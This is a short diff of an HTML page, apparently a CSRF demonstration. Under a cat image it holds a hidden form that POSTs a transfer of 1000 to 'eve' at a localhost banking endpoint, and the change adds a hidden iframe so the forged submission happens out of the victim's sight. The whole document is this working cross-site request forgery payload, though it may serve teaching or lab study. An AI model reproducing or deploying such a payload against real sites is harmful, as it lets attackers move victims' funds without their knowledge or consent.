@@ -15,7 +15,14 @@
 
     <img src="cat.jpg" />
 
-    <form name="hiddenForm" style="visibility: hidden" action="http://localhost:8080/api/transfer" method="POST">
+    <iframe id="invisibleFrame" name="invisibleFrame" style="display:none"></iframe>
+
+    <form name="hiddenForm"
+          style="display:none"
+          action="http://localhost:8080/api/transfer"
+          method="POST"
+          target="invisibleFrame"
+    >
         <input type="hidden" name="to" value="eve">
         <input type="hidden" name="amount" value="1000">
     </form>
